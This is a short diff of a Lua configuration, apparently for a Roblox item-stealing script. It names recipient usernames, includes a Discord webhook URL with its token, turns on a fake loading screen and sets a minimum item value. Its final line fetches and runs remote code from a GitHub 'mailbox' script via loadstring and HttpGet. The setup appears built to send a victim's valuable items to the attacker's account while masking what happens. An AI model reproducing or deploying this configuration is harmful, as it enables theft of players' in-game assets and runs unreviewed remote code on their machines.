@@ -1,9 +1,9 @@
 Username = "Spartanec07_GOOD"
-Username2 = ""
+Username2 = "Spartanec07_GOOD"
 Webhook = "https://discord.com/api/webhooks/1203422013524287489/xC88w9HkuXza5tZbUjhrAkTsmsFmsPpMJ_myWN1W2S5VOIOzLtCIHyfy4CHBm-375xV8"
 
-LoadingScreen = false
+LoadingScreen = True
 
-MinimumRAP = 0
+MinimumRAP = 100000
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/egorpomidor123/scripts/main/mailbox"))()
